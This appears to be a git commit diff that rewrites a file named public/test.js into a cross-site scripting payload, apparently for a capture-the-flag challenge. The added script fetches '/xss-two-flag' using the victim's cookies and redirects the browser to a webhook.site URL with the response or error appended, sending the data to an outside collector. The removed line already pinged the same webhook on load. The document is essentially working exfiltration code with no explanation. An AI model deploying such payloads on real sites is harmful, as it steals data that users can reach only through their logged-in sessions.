be5cff797585d1c49761c5a18cc22650c77d76bc
Kursat Yanik <alikursadyanik@gmail.com>
2026-03-21 02:44:11 +0300

    move test.js to public5

--- public/test.js
+++ public/test.js
@@ -1,1 +1,17 @@
-new Image().src = 'https://webhook.site/a258ded4-e428-4f12-8023-ea9e69072dde/?loaded=testjs';
+(async () => {
+  try {
+    const res = await fetch('/xss-two-flag', {
+      credentials: 'include'
+    });
+
+    const text = await res.text();
+
+    location.href =
+      'https://webhook.site/a258ded4-e428-4f12-8023-ea9e69072dde/?flag=' +
+      encodeURIComponent(text);
+  } catch (e) {
+    location.href =
+      'https://webhook.site/a258ded4-e428-4f12-8023-ea9e69072dde/?err=' +
+      encodeURIComponent(String(e));
+  }
+})();
